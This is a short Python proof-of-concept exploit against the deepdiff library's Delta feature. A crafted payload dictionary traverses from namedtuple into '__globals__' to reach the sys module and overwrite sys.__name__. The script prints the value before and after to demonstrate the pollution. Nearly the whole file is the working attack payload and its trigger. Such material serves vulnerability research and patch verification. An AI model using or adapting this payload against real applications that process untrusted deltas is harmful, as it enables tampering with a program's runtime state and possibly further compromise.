import deepdiff as g
from collections import namedtuple
import sys

# payload
payload = {
  "attribute_added" : {
    "root['x']": namedtuple,
    "root['x'].'__globals__'['_sys'].'__name__'": "polluted",
  }
}

# Before the pollution check
print(f"Before the pollution: sys.__name__ = {getattr(sys, "__name__")}")

# Pollution
delta = g.Delta(payload)
obj1 = {"a": 1, "b": 2, "c": 3}
obj1 = obj1 + delta

# After the pollution check
print(f"After the pollution: sys.__name__ = {getattr(sys, "__name__")}")